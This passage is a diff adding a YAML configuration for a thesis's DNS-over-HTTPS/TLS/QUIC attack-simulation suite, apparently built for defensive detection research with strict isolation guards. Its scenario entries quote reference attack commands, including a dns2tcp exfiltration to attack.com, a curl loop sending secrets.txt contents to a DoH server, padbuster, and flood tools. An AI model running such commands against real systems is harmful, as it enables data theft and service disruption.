@@ -1,0 +1,1060 @@
+# =============================================================================
+# E3-DoH Reproducibility — Attack Suite Runtime Parameters
+# =============================================================================
+#
+# Chapter 5 of the thesis: E3-DoH (Enhanced Evolutionary Encryption for
+# Multi-Protocol DNS Security — DoH, DoT, DoQ).
+#
+# This file holds the *runtime* parameters of the attack suite: the
+# per-attack rate, duration, target, and payload specification for each
+# of the fifteen attack scenarios, plus the safety guards that govern
+# how the suite may be executed. It does NOT hold the detection triggers
+# or mitigation actions as free-text; those are owned by other files
+# (see §7 and §8 below) and are referenced here by canonical key so that
+# there is exactly one source of truth for each.
+#
+# WHAT THIS FILE IS.
+#   A declarative specification of the attack-execution environment. The
+#   `data/attack_matrix.csv` file (next in the delivery sequence) holds
+#   the same information in machine-readable tabular form. This file and
+#   that CSV must agree row-for-row; the verification script (§9) checks
+#   that they do.
+#
+# WHAT THIS FILE IS NOT.
+#   It is not an offensive tool. It is not a penetration-testing
+#   framework. It is not a vulnerability scanner. It is the parameter
+#   sheet for the *simulations* that reproduce the detection and
+#   mitigation behaviour reported in the thesis. See the LICENSE file's
+#   Defensive-Research Rider for the enforceable terms; the summary in
+#   §10 below is a plain-language restatement for convenience only.
+#
+# SAFETY GUARD — READ BEFORE EDITING.
+#   Two parameters in §2 are HARD guards that the attack runner enforces
+#   at load time: `isolation_required` and `target_must_be_local`. Both
+#   default to true and both fail loudly if changed. Do not disable them.
+#   A run with either guard disabled will refuse to start.
+#
+# Sibling files:
+#   default_e3_config.yaml     — master config, includes this file by reference
+#   aee_params.yaml            — entropy thresholds referenced by A01
+#   qhe_params.yaml            — QHE parameters used by A05 and A15
+#   fl_dp_params.yaml          — FL parameters used by the model-poisoning guard
+#   sandbox_mdp_params.yaml    — mitigation actions referenced by §8
+#   riemannian_metrics.yaml    — detection triggers referenced by §7
+#
+# =============================================================================
+
+
+# -----------------------------------------------------------------------------
+# 1. Metadata
+# -----------------------------------------------------------------------------
+# Identifies the component and the exact scope of this file. The
+# `coverage` block below enumerates which thesis tables are covered, so
+# that a reviewer can confirm this file is complete without opening the
+# thesis.
+
+metadata:
+  framework: "E3-DoH"
+  component: "AttackSuite"
+  component_full_name: "Attack Injection and Detection Suite"
+  artifact_version: "1.0.0"
+  thesis_section: "5.8.5-5.10, 5.14-5.15"
+  thesis_page_anchor: "p.140-143, p.147-149"
+  # The thesis tables this file covers. Every row of every table below
+  # has a corresponding entry in §5.
+  coverage:
+    - "Table 18 (p.134) — attack injection methods and detection mechanisms"
+    - "Table 21 (p.140) — dns2tcp exfiltration parameter configuration"
+    - "Table 22 (p.141) — advanced attack scenarios with E3-DoH response"
+    - "Table 23 (p.142) — network attack injection commands"
+    - "Table 24 (p.143) — attack injection techniques and defences"
+  # The fifteen scenarios are enumerated in §5. The table-to-scenario
+  # mapping is in each scenario's `table_refs` field.
+  scenario_count: 15
+
+
+# -----------------------------------------------------------------------------
+# 2. Safety guards (HARD constraints — do not disable)
+# -----------------------------------------------------------------------------
+# These two guards are enforced by src/attacks/__init__.py at import
+# time. A violation is a hard error, not a warning, because the
+# consequences of a misconfigured attack suite are physical: traffic
+# reaching a real network from a simulation that was supposed to be
+# isolated. The LICENSE Defensive-Research Rider §3 states this
+# requirement in enforceable terms; this block implements it.
+
+safety_guards:
+  # Guard 1 — isolation. The attack suite must run inside an isolated
+  # network namespace. Disabling this guard is not permitted; the runner
+  # will raise IsolationGuardViolation and refuse to proceed.
+  isolation_required: true
+  # The enforcement mechanism. `ip netns` is the standard Linux
+  # primitive; the runner shells out to it. If `ip netns` is not
+  # available on the host (e.g. some minimal containers), the runner
+  # falls back to a Docker network with `--internal` flag (no egress)
+  # and fails if neither is available.
+  isolation_backend: "ip_netns"      # options: "ip_netns" | "docker_internal"
+  # Namespace name prefix. Each attack gets a fresh namespace named
+  # <prefix><attack_id>; the namespace is destroyed on process exit.
+  namespace_prefix: "e3doh_atk_"
+  # The interface inside the namespace that the attack targets are
+  # bound to. The runner sets this interface up and tears it down.
+  loopback_interface: "lo"
+
+  # Guard 2 — target must be local. The attack suite must target the
+  # loopback or a reserved private address; it must not target any
+  # public address. The runner validates every `target` field in §5
+  # against the CIDR allowlist below and refuses to proceed if any
+  # target is outside it.
+  target_must_be_local: true
+  target_cidr_allowlist:
+    - "127.0.0.0/8"                  # loopback
+    - "10.0.0.0/8"                   # RFC 1918 private
+    - "172.16.0.0/12"                # RFC 1918 private
+    - "192.168.0.0/16"               # RFC 1918 private
+    - "::1/128"                      # IPv6 loopback
+    - "fc00::/7"                     # IPv6 unique-local
+  # A target that resolves to an address outside the allowlist (e.g.
+  # because of a misconfigured /etc/hosts or DNS) is a hard error.
+  # The runner resolves every hostname to an address and checks the
+  # resolved address, not the hostname string.
+
+  # Additional guard — no privileged ports. The attack suite may only
+  # bind to and target ports above 1024. A target port below 1024 is
+  # an error, because the runner does not have (and must not be given)
+  # the privilege to bind to such a port in a shared environment.
+  no_privileged_ports: true
+  min_port: 1024
+
+  # Additional guard — no external network. The namespace must not
+  # have an egress route. The runner verifies this by attempting to
+  # reach a sentinel address (8.8.8.8:53) from inside the namespace
+  # before the attack starts; if the sentinel is reachable, the run is
+  # aborted with EgressDetectedError.
+  no_external_network: true
+  sentinel_address: "8.8.8.8"
+  sentinel_port: 53
+
+
+# -----------------------------------------------------------------------------
+# 3. Global runtime
+# -----------------------------------------------------------------------------
+# Parameters that apply to every attack scenario. These are the
+# defaults; a per-scenario `runtime_override` in §5 can override them,
+# but the override must stay within the global bounds.
+
+runtime:
+  # Wall-clock timeout per scenario. A scenario that runs longer than
+  # this is killed and recorded as `"status": "timeout"`. The value
+  # matches default_e3_config.yaml §10 (`timeout_seconds: 300`).
+  timeout_seconds: 300
+
+  # Global rate cap. No scenario may exceed this rate of attack-packet
+  # generation, in packets per second, summed over all senders. This
+  # prevents a misconfigured scenario from saturating the host's
+  # network stack in a way that affects other processes on the shared
+  # machine. The per-scenario `rate` in §5 must be below this cap.
+  global_rate_cap_pps: 200_000
+
+  # Global duration cap. No scenario may run longer than this, in
+  # seconds of wall-clock time. The per-scenario `duration_seconds` in
+  # §5 must be below this cap. This is separate from `timeout_seconds`
+  # because a scenario can set its own `duration_seconds` (the attack
+  # is designed to run for exactly N seconds) while the timeout is the
+  # watchdog that kills it if it hangs.
+  global_duration_cap_seconds: 600
+
+  # Whether to capture a PCAP for each scenario. PCAPs are written to
+  # artifacts/ (gitignored) and are useful for debugging a detection
+  # mismatch. In toy mode this is off by default.
+  capture_pcap: false
+  capture_snaplen_bytes: 262144
+  capture_buffer_mb: 64
+
+  # Whether to run the scenarios in parallel. Parallel execution is
+  # disabled by default because the namespace isolation, while correct,
+  # is easier to verify one scenario at a time. A reviewer who wants
+  # to speed up a full run can enable it with the caveat that the
+  # reference timings in Table 20 are for sequential execution.
+  parallel: false
+  max_parallel: 1
+
+  # Whether to run a sentinel check (see §2, no_external_network) at
+  # the start of every scenario. The check takes ~50 ms and is cheap.
+  verify_egress_blocked: true
+
+
+# -----------------------------------------------------------------------------
+# 4. Attack corpus loader
+# -----------------------------------------------------------------------------
+# The authoritative scenario specification is data/attack_matrix.csv.
+# This YAML file and that CSV are kept in sync by the verification
+# script (§9). The loader below tells the runner where to find the CSV
+# and which columns it must agree with this file on.
+
+corpus:
+  csv_path: "data/attack_matrix.csv"
+  # The columns of the CSV. The verification script checks that this
+  # list matches the CSV header exactly.
+  required_columns:
+    - "Attack_ID"
+    - "Attack_Vector"
+    - "Protocol"
+    - "Tool"
+    - "Command_Syntax"
+    - "Detection_Trigger"
+    - "Mitigation_Action"
+  # The rows in the CSV must be exactly the ids A01..A15 in §5. The
+  # verification script raises if a row is missing or extra.
+  expected_ids:
+    - "A01"
+    - "A02"
+    - "A03"
+    - "A04"
+    - "A05"
+    - "A06"
+    - "A07"
+    - "A08"
+    - "A09"
+    - "A10"
+    - "A11"
+    - "A12"
+    - "A13"
+    - "A14"
+    - "A15"
+  # The scenario IDs in §5 are the canonical keys. The verification
+  # script checks that every row in the CSV has a corresponding entry
+  # in §5, and vice versa.
+
+
+# -----------------------------------------------------------------------------
+# 5. Per-attack scenarios (A01 – A15)
+# -----------------------------------------------------------------------------
+# Each scenario has:
+#   id                : the canonical identifier (A01..A15)
+#   attack_vector     : the vector name as it appears in the thesis table
+#   protocol          : the encrypted DNS protocol the attack targets
+#   module            : the Python module in src/attacks/ that implements
+#                       the simulation
+#   table_refs        : which thesis tables this scenario appears in
+#   tool_reference    : the tool the thesis names as the reference for
+#                       this scenario, for a reviewer who wants to see
+#                       the real-world counterpart of the simulation
+#   command_reference : the command string as recorded in the thesis, for
+#                       reference only — the simulation does NOT shell out
+#                       to this command; it re-implements the injection
+#                       inside the isolated namespace
+#   target            : the address the simulation targets; must be inside
+#                       the allowlist of §2
+#   target_port       : the port the simulation targets; must be >= 1024
+#   rate              : the target rate (units noted per scenario)
+#   duration_seconds  : the run duration
+#   payload           : the payload specification
+#   detection_trigger : a reference by canonical key into §7
+#   mitigation_action : a reference by canonical key into §8
+#   runtime_override  : optional per-scenario overrides of §3 defaults
+#
+# The `detection_trigger` and `mitigation_action` fields point into the
+# registries in §7 and §8; they do NOT restate the trigger or action
+# text, because restating would create two sources of truth that could
+# drift. The verification script checks that the referenced key exists.
+
+attacks:
+
+  # ===========================================================================
+  # Table 18 group — the five baseline detection-trigger scenarios.
+  # These are the scenarios that the thesis Table 18 (p.134) uses to
+  # establish that the four E3-DoH layers (AEE, QHE, MP-FL, AMPS) fire
+  # in the correct order.
+  # ===========================================================================
+
+  # A01 — DNS tunneling via DoH (Table 18 row 1; Table 21).
+  - id: "A01"
+    attack_vector: "DNS Tunneling via DoH"
+    protocol: "doh"
+    module: "src.attacks.dns_tunneling"
+    table_refs:
+      - "Table 18 (p.134) row 1"
+      - "Table 21 (p.140)"
+      - "Table 22 (p.141) row 1 (slow-drip, related)"
+    tool_reference: "dns2tcp"
+    command_reference: "python3 dns2tcp.py -z attack.com -r 53 -t A -d exfil_data.bin"
+    target: "127.0.0.1"
+    target_port: 53
+    rate:
+      value: 20
+      unit: "queries_per_minute"
+    duration_seconds: 120
+    payload:
+      type: "base64_encoded_subdomain"
+      encoding: "base64"
+      max_subdomain_length_bytes: 253
+      record_types: ["A"]
+      source_file: "artifacts/exfil_data.bin"   # generated by the runner if absent
+      source_size_bytes: 1024                    # 1 KB synthetic payload
+    detection_trigger: "trigger.aee_entropy_doh"
+    mitigation_action: "mitigation.sandbox_doh"
+    runtime_override: {}
+
+  # A02 — Timing side-channel via DoT (Table 18 row 2; Table 23).
+  - id: "A02"
+    attack_vector: "Timing Side-Channel"
+    protocol: "dot"
+    module: "src.attacks.timing_side_channel"
+    table_refs:
+      - "Table 18 (p.134) row 2"
+      - "Table 23 (p.142) row 1"
+    tool_reference: "tc + netem"
+    command_reference: "tc qdisc add dev eth0 root netem delay 150ms 25ms"
+    target: "127.0.0.1"
+    target_port: 853
+    rate:
+      value: 100
+      unit: "probes"
+    duration_seconds: 60
+    payload:
+      type: "controlled_delay_injection"
+      mean_delay_ms: 150.0
+      std_delay_ms: 25.0
+      distribution: "gaussian"
+      query_count: 100
+    detection_trigger: "trigger.mlp_temporal_dot"
+    mitigation_action: "mitigation.adaptive_padding_dot"
+    runtime_override: {}
+
+  # A03 — QUIC congestion exploit (Table 18 row 3; Table 23).
+  - id: "A03"
+    attack_vector: "QUIC Congestion Exploit"
+    protocol: "doq"
+    module: "src.attacks.quic_congestion"
+    table_refs:
+      - "Table 18 (p.134) row 3"
+      - "Table 23 (p.142) row 2"
+      - "Table 24 (p.143) row 5 (connection-ID exhaustion, sub-mode)"
+    tool_reference: "quic-flood"
+    command_reference: "python3 quic-flood.py --pps 50000 --spin-bit 1 --version 0x00000001"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 50_000
+      unit: "packets_per_second"
+    duration_seconds: 30
+    payload:
+      type: "quic_packet_flood"
+      spin_bit: 1
+      quic_version: "0x00000001"
+      # Sub-mode from Table 24 row 5 — connection-ID exhaustion. When
+      # enabled, the flood cycles through fresh connection IDs at
+      # >100/s, which triggers the per-CID limit on the server. The
+      # default sub-mode is the spin-bit flood from Table 23 row 2.
+      sub_mode: "spin_bit_flood"       # options: "spin_bit_flood" | "cid_exhaustion"
+    detection_trigger: "trigger.quic_congestion"
+    mitigation_action: "mitigation.rate_throttle_doq"
+    runtime_override: {}
+
+  # A04 — Certificate injection (Table 18 row 4; Table 23).
+  - id: "A04"
+    attack_vector: "Certificate Injection"
+    protocol: "doh"
+    module: "src.attacks.cert_injection"
+    table_refs:
+      - "Table 18 (p.134) row 4"
+      - "Table 23 (p.142) row 4"
+    tool_reference: "mitmproxy"
+    command_reference: "mitmproxy --mode transparent --ssl-insecure"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 10
+      unit: "handshakes_per_second"
+    duration_seconds: 60
+    payload:
+      type: "forged_certificate"
+      sni: "malicious.example.com"
+      alpn: "h2"
+      # The forged certificate is self-signed and has an SNI that does
+      # not match the target's actual SNI, which is what triggers the
+      # verify(SNI, ALPN) == False detection.
+      cert_generation: "self_signed_ed25519"
+    detection_trigger: "trigger.sni_alpn_mismatch"
+    mitigation_action: "mitigation.immediate_termination_alert"
+    runtime_override: {}
+
+  # A05 — Padding oracle (Table 18 row 5; Table 23).
+  - id: "A05"
+    attack_vector: "Padding Oracle"
+    protocol: "dot"
+    module: "src.attacks.padding_oracle"
+    table_refs:
+      - "Table 18 (p.134) row 5"
+      - "Table 23 (p.142) row 3"
+    tool_reference: "padbuster"
+    command_reference: "ruby padbuster.rb https://doh.server/encrypted AAAAA 8 -encoding 1"
+    target: "127.0.0.1"
+    target_port: 853
+    rate:
+      value: 200
+      unit: "requests_per_second"
+    duration_seconds: 60
+    payload:
+      type: "ciphertext_padding_iteration"
+      block_size_bytes: 16
+      encoding: "base64"
+      # The padding oracle attack iterates the last block of the
+      # ciphertext, byte by byte, and observes the server's error
+      # response. The detection trigger is the homomorphic equality
+      # check (HE.eval(c1 == c2) without decryption).
+      max_iterations: 4096
+    detection_trigger: "trigger.homomorphic_padding_equality"
+    mitigation_action: "mitigation.ciphertext_rerandomisation"
+    runtime_override: {}
+
+
+  # ===========================================================================
+  # Table 22 group — the five advanced scenarios. These are the scenarios
+  # that stress the *adaptive* response of the framework (Table 22, p.141).
+  # They are designed to evade static detection triggers and are the
+  # reason the framework uses AMPS (sandbox) rather than simple rule-based
+  # blocking.
+  # ===========================================================================
+
+  # A06 — Slow-drip exfiltration (Table 22 row 1).
+  - id: "A06"
+    attack_vector: "Slow-Drip Exfiltration"
+    protocol: "doh"
+    module: "src.attacks.dns_tunneling"
+    table_refs:
+      - "Table 22 (p.141) row 1"
+    tool_reference: "curl (shell loop)"
+    command_reference: "for i in $(cat secrets.txt); do curl -H 'Content-Type: application/dns-message' https://doh.server/dns-query?dns=$i; sleep $((RANDOM%3+1)); done"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 1
+      unit: "queries_per_second"
+      # The low rate is the whole point of the slow-drip attack — it
+      # stays below the volumetric detection threshold and relies on
+      # the *autocorrelation* of query timings to be detected.
+    duration_seconds: 300
+    payload:
+      type: "slow_drip_exfiltration"
+      inter_query_delay_s: [1.0, 4.0]   # uniform random in [1.0, 4.0]
+      source_file: "artifacts/secrets.txt"
+      source_size_bytes: 2048
+      # The sub-mode of the dns_tunneling module. Unlike A01 (which
+      # uses a fixed-rate stream), A06 uses a randomised inter-query
+      # delay, which is what defeats simple rate-based detection.
+      sub_mode: "slow_drip"
+    detection_trigger: "trigger.sequential_pattern_autocorr"
+    mitigation_action: "mitigation.broadcast_alert_and_rate_limit"
+    runtime_override: {}
+
+  # A07 — QUIC version downgrade (Table 22 row 2).
+  - id: "A07"
+    attack_vector: "QUIC Version Downgrade"
+    protocol: "doq"
+    module: "src.attacks.quic_congestion"
+    table_refs:
+      - "Table 22 (p.141) row 2"
+    tool_reference: "Scapy (custom)"
+    command_reference: "modify_packet(version_field=0x00000000); replay"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 50
+      unit: "replays"
+    duration_seconds: 60
+    payload:
+      type: "quic_version_field_rewrite"
+      # Rewrites the version field to a legacy value (0x00000000)
+      # and replays a captured handshake. The detection trigger is the
+      # server-side assertion that the offered version intersects with
+      # the supported version set.
+      version_field: "0x00000000"
+      replay_count: 50
+      sub_mode: "version_downgrade"
+    detection_trigger: "trigger.version_consistency"
+    mitigation_action: "mitigation.connection_close_and_log"
+    runtime_override: {}
+
+  # A08 — HTTP/2 frame storm (Table 22 row 3).
+  - id: "A08"
+    attack_vector: "HTTP/2 Frame Storm"
+    protocol: "doh"
+    module: "src.attacks.cert_injection"   # uses the same HTTP/2 plumbing as A04
+    table_refs:
+      - "Table 22 (p.141) row 3"
+      - "Table 24 (p.143) row 4 (stream dependency loop, sub-mode)"
+    tool_reference: "h2storm"
+    command_reference: "python3 h2storm.py --target doh.server --frames PING,PING,PING,DATA --interval 0.001"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 1000
+      unit: "frames_per_second"
+    duration_seconds: 60
+    payload:
+      type: "http2_frame_injection"
+      frame_types: ["PING", "PING", "PING", "DATA"]
+      inter_frame_interval_s: 0.001
+      # Sub-mode from Table 24 row 4 — stream dependency loop. When
+      # enabled, the injection creates a cyclic dependency in the
+      # stream tree (1->0, 2->1, 1->2), which the RFC 7540 compliance
+      # check detects as a cycle.
+      sub_mode: "frame_storm"          # options: "frame_storm" | "stream_dependency_loop"
+    detection_trigger: "trigger.frame_rate_limiter"
+    mitigation_action: "mitigation.dynamic_frame_policing"
+    runtime_override: {}
+
+  # A09 — Encrypted SNI poisoning (Table 22 row 4).
+  - id: "A09"
+    attack_vector: "Encrypted SNI Poisoning"
+    protocol: "doh"
+    module: "src.attacks.cert_injection"
+    table_refs:
+      - "Table 22 (p.141) row 4"
+    tool_reference: "custom middlebox injector"
+    command_reference: "inject_esni(encrypted_sni=malicious.com)"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 5
+      unit: "injections_per_second"
+    duration_seconds: 60
+    payload:
+      type: "esni_injection"
+      # The injection replaces the encrypted SNI with one for a
+      # malicious host while keeping the outer TLS session intact.
+      # The detection trigger is the homomorphic SNI-verification
+      # check (HE.verify(esni, cert_hash)).
+      injected_sni: "malicious.example.com"
+      sub_mode: "sni_poisoning"
+    detection_trigger: "trigger.homomorphic_sni_verification"
+    mitigation_action: "mitigation.alternative_routing_and_alert"
+    runtime_override: {}
+
+  # A10 — Adaptive chaff injection (Table 22 row 5).
+  - id: "A10"
+    attack_vector: "Adaptive Chaff Injection"
+    protocol: "doh"
+    module: "src.attacks.dns_tunneling"
+    table_refs:
+      - "Table 22 (p.141) row 5"
+    tool_reference: "custom GAN-driven chaff generator"
+    command_reference: "while true; do size=$((RANDOM%512+64)); send_encrypted_query(random_bytes(size)); delay=...; done"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 100
+      unit: "queries_per_second"
+    duration_seconds: 120
+    payload:
+      type: "gan_adaptive_chaff"
+      # The chaff queries are generated by the same GAN that trains
+      # the detection model (see thesis §4.6.1 for the GAN reference,
+      # applied here to the E3-DoH attack suite). The generator is
+      # loaded from the checkpoint at the path below.
+      generator_checkpoint: "outputs/checkpoints/chaff_generator.pt"
+      sub_mode: "adaptive_chaff"
+    detection_trigger: "trigger.evolutionary_pattern_matching"
+    mitigation_action: "mitigation.adaptive_thresholding_and_sandbox"
+    runtime_override: {}
+
+
+  # ===========================================================================
+  # Table 23 group — the five network-layer injection commands. These are
+  # the scenarios that the thesis Table 23 (p.142) uses to establish that
+  # the framework is robust against the layer attacks it was not
+  # specifically designed for.
+  # ===========================================================================
+
+  # A11 — DNS query flood (Table 23 row 1).
+  - id: "A11"
+    attack_vector: "DNS Query Flood"
+    protocol: "doh"
+    module: "src.attacks.dns_tunneling"
+    table_refs:
+      - "Table 23 (p.142) row 1"
+      - "Table 24 (p.143) row 1 (IP fragmentation, sub-mode)"
+      - "Table 24 (p.143) row 2 (TCP sequence prediction, sub-mode)"
+    tool_reference: "dnsperf"
+    command_reference: "dnsperf -s doh.server -d queries.txt -c 100 -Q 10000 -l 60"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 10_000
+      unit: "queries_per_second"
+    duration_seconds: 60
+    payload:
+      type: "query_flood"
+      clients: 100
+      query_list_file: "data/synthetic/flood_queries.txt"   # generated by the runner
+      query_count: 600_000
+      # Sub-modes from Table 24:
+      #   "query_flood"           : plain volumetric flood
+      #   "ip_fragmentation"      : adds nmap-style IP fragmentation
+      #   "tcp_sequence_prediction": adds spoofed TCP injection
+      sub_mode: "query_flood"          # options: "query_flood" | "ip_fragmentation" | "tcp_sequence_prediction"
+    detection_trigger: "trigger.query_rate_threshold"
+    mitigation_action: "mitigation.rate_limiting_amps"
+    runtime_override: {}
+
+  # A12 — TLS handshake abuse (Table 23 row 2).
+  - id: "A12"
+    attack_vector: "TLS Handshake Abuse"
+    protocol: "dot"
+    module: "src.attacks.cert_injection"
+    table_refs:
+      - "Table 23 (p.142) row 2"
+      - "Table 24 (p.143) row 3 (TLS renegotiation, sub-mode)"
+    tool_reference: "testssl"
+    command_reference: "testssl -jsonfile log.json -vulnerable -headers"
+    target: "127.0.0.1"
+    target_port: 853
+    rate:
+      value: 50
+      unit: "handshakes_per_second"
+    duration_seconds: 60
+    payload:
+      type: "tls_handshake_abuse"
+      # The abuse cycles through weak ciphersuite offers and malformed
+      # extensions, to test whether the framework's TLS session-
+      # validation layer catches them.
+      cipher_suite_cycle: ["TLS_RSA_WITH_AES_128_CBC_SHA", "TLS_RSA_WITH_3DES_EDE_CBC_SHA"]
+      malformed_extensions: true
+      # Sub-mode from Table 24 row 3 — TLS renegotiation. When
+      # enabled, the injection triggers repeated renegotiations,
+      # which the session-renegotiation-count check detects.
+      sub_mode: "handshake_abuse"      # options: "handshake_abuse" | "tls_renegotiation"
+    detection_trigger: "trigger.cipher_suite_mismatch"
+    mitigation_action: "mitigation.tls_state_machine_verification"
+    runtime_override: {}
+
+  # A13 — QUIC reflection (Table 23 row 3).
+  - id: "A13"
+    attack_vector: "QUIC Reflection"
+    protocol: "doq"
+    module: "src.attacks.quic_congestion"
+    table_refs:
+      - "Table 23 (p.142) row 3"
+    tool_reference: "quic-attack"
+    command_reference: "./quic_attack -reflect -amplify 50 -threads 16"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 5_000
+      unit: "packets_per_second"
+    duration_seconds: 60
+    payload:
+      type: "quic_reflection_amplification"
+      amplification_factor: 50
+      threads: 16
+      sub_mode: "reflection"
+    detection_trigger: "trigger.response_size_anomaly"
+    mitigation_action: "mitigation.rate_limiting_amps"
+    runtime_override: {}
+
+  # A14 — HTTP/2 continuation flood (Table 23 row 4).
+  - id: "A14"
+    attack_vector: "HTTP/2 Continuation Flood"
+    protocol: "doh"
+    module: "src.attacks.cert_injection"
+    table_refs:
+      - "Table 23 (p.142) row 4"
+    tool_reference: "h2load"
+    command_reference: "h2load -n 100000 -c 1000 -m 100 https://doh.server/dns-query"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 100_000
+      unit: "requests"
+    duration_seconds: 60
+    payload:
+      type: "http2_continuation_flood"
+      requests: 100_000
+      concurrent_connections: 1000
+      max_concurrent_streams: 100
+      sub_mode: "continuation_flood"
+    detection_trigger: "trigger.header_table_state_anomaly"
+    mitigation_action: "mitigation.dynamic_frame_policing"
+    runtime_override: {}
+
+  # A15 — Encrypted payload fuzzing (Table 23 row 5).
+  - id: "A15"
+    attack_vector: "Encrypted Payload Fuzzing"
+    protocol: "doh"
+    module: "src.attacks.padding_oracle"   # reuses the ciphertext-injection plumbing
+    table_refs:
+      - "Table 23 (p.142) row 5"
+      - "Table 24 (p.143) row 5 (connection-ID exhaustion, sub-mode)"  # via A03's sub-mode
+    tool_reference: "boofuzz"
+    command_reference: "python3 doh_fuzzer.py --target doh.server:443 --runtime 300"
+    target: "127.0.0.1"
+    target_port: 443
+    rate:
+      value: 500
+      unit: "fuzzed_requests_per_second"
+    duration_seconds: 300
+    payload:
+      type: "encrypted_payload_fuzzing"
+      mutation_rate: 0.5
+      runtime_seconds: 300
+      payload_depth: 3
+      sub_mode: "payload_fuzzing"
+    detection_trigger: "trigger.payload_structure_violation"
+    mitigation_action: "mitigation.terminate_doh_stream"
+    runtime_override: {}
+
+
+# -----------------------------------------------------------------------------
+# 6. Attack module mapping
+# -----------------------------------------------------------------------------
+# Every attack in §5 refers to a Python module in src/attacks/. The
+# mapping below lists each module and the scenarios it handles, so that
+# a reviewer who wants to read the code can see at a glance which
+# scenarios a given module covers.
+#
+# The modules are re-implementations of the thesis's reference tools.
+# They do NOT shell out to the reference tools (dns2tcp, quic-flood,
+# mitmproxy, padbuster, boofuzz, etc.); they re-implement the injection
+# inside the isolated network namespace so that the simulation is
+# hermetic, auditable, and runs without external tool installation.
+
+module_map:
+  src.attacks.dns_tunneling:
+    scenarios: ["A01", "A06", "A10", "A11"]
+    summary: "DNS tunneling and query-flood simulations, including the slow-drip and adaptive-chaff variants. Implements base64 subdomain encoding, randomised inter-query delay, GAN-driven chaff generation, and volumetric query flooding."
+
+  src.attacks.timing_side_channel:
+    scenarios: ["A02"]
+    summary: "Timing side-channel simulation. Injects controlled delay (mean 150 ms, std 25 ms, Gaussian) into the DoT flow and measures the correlation between query timing and response timing."
+
+  src.attacks.quic_congestion:
+    scenarios: ["A03", "A07", "A13"]
+    summary: "QUIC congestion, version-downgrade, and reflection simulations. Implements spin-bit flooding, connection-ID exhaustion, version-field rewriting, and reflection amplification."
+
+  src.attacks.cert_injection:
+    scenarios: ["A04", "A08", "A09", "A12", "A14"]
+    summary: "Certificate and handshake simulations. Implements forged-certificate injection, HTTP/2 frame storm, encrypted-SNI poisoning, TLS handshake abuse, and HTTP/2 continuation flood."
+
+  src.attacks.padding_oracle:
+    scenarios: ["A05", "A15"]
+    summary: "Padding-oracle and encrypted-payload fuzzing simulations. Implements CBC padding iteration and structured payload mutation."
+
+
+# -----------------------------------------------------------------------------
+# 7. Detection trigger registry
+# -----------------------------------------------------------------------------
+# Every detection trigger referenced in §5 is defined here, with its
+# mathematical form and its source-of-truth pointer. The trigger is
+# enforced by the module that implements the corresponding component
+# (AEE, QHE, MP-FL, or AMPS), not by the attack suite itself; the
+# attack suite is a *consumer* of the trigger, not its owner.
+#
+# The `owner_file` field points at the config file that owns the
+# trigger's parameters, so that a reviewer who wants to tune a
+# trigger can see where to do it without touching this file. This
+# file's role is to *name* the trigger and *reference* its owner.
+
+detection_triggers:
+  # --- AEE-owned triggers ---
+
+  trigger.aee_entropy_doh:
+    description: "Shannon entropy of the query-type distribution exceeds 2.5 bits/query AND the composite entropy score exceeds 3.8."
+    owner_file: "configs/aee_params.yaml §4"
+    owner_keys:
+      - "entropy_functional.family"
+      - "entropy_functional.query_types"
+    reference_expression: "ΔH > 2.5 bits/query ∧ entropy_score > 3.8"
+    reference_table: "Table 18 (p.134) row 1"
+
+  trigger.sequential_pattern_autocorr:
+    description: "Autocorrelation of inter-query intervals at lag 5 exceeds 0.8."
+    owner_file: "configs/aee_params.yaml §4"
+    reference_expression: "autocorr(queries, lag=5) > 0.8"
+    reference_table: "Table 22 (p.141) row 1"
+
+  trigger.evolutionary_pattern_matching:
+    description: "Genetic-algorithm-driven detector that adapts its thresholds in real time to the observed chaff distribution."
+    owner_file: "src/attacks/dns_tunneling.py (internal; no config file owner)"
+    reference_expression: "GA.optimize(detector_weights)"
+    reference_table: "Table 22 (p.141) row 5"
+
+  # --- MLP / anomaly-detector triggers ---
+
+  trigger.mlp_temporal_dot:
+    description: "Correlation between query timing and response timing is below 0.1."
+    owner_file: "configs/sandbox_mdp_params.yaml §7"
+    reference_expression: "corr(t_query, t_resp) < 0.1"
+    reference_table: "Table 18 (p.134) row 2; Table 23 (p.142) row 1"
+
+  trigger.quic_congestion:
+    description: "Growth rate of the QUIC congestion window exceeds the learned threshold by 3 sigma."
+    owner_file: "configs/sandbox_mdp_params.yaml §7"
+    reference_expression: "cwnd_growth_rate > threshold_3sigma"
+    reference_table: "Table 18 (p.134) row 3"
+
+  trigger.version_consistency:
+    description: "Server-side assertion that the offered QUIC version intersects with the supported version set."
+    owner_file: "src/attacks/quic_congestion.py (internal)"
+    reference_expression: "supported_versions ∩ offered ≠ ∅"
+    reference_table: "Table 22 (p.141) row 2"
+
+  trigger.frame_rate_limiter:
+    description: "HTTP/2 frame rate exceeds 1000 frames per second."
+    owner_file: "src/attacks/cert_injection.py (internal)"
+    reference_expression: "frames_per_second > 1000"
+    reference_table: "Table 22 (p.141) row 3"
+
+  trigger.header_table_state_anomaly:
+    description: "Header table state is inconsistent with the advertised maximum concurrent streams (anomalous number of CONTINUATION frames)."
+    owner_file: "src/attacks/cert_injection.py (internal)"
+    reference_expression: "continuation_count > max_concurrent_streams"
+    reference_table: "Table 23 (p.142) row 4"
+
+  trigger.payload_structure_violation:
+    description: "Fuzzed payload violates the application/dns-message wire format, or produces a TLS decryption error on the server side."
+    owner_file: "src/attacks/padding_oracle.py (internal)"
+    reference_expression: "wire_format_valid(payload) == False ∨ tls_decryption_error"
+    reference_table: "Table 23 (p.142) row 5"
+
+  # --- TLS-layer triggers ---
+
+  trigger.sni_alpn_mismatch:
+    description: "The SNI and ALPN in the TLS handshake are inconsistent with the server's expected values."
+    owner_file: "src/attacks/cert_injection.py (internal)"
+    reference_expression: "verify(SNI, ALPN) == False"
+    reference_table: "Table 18 (p.134) row 4"
+
+  trigger.cipher_suite_mismatch:
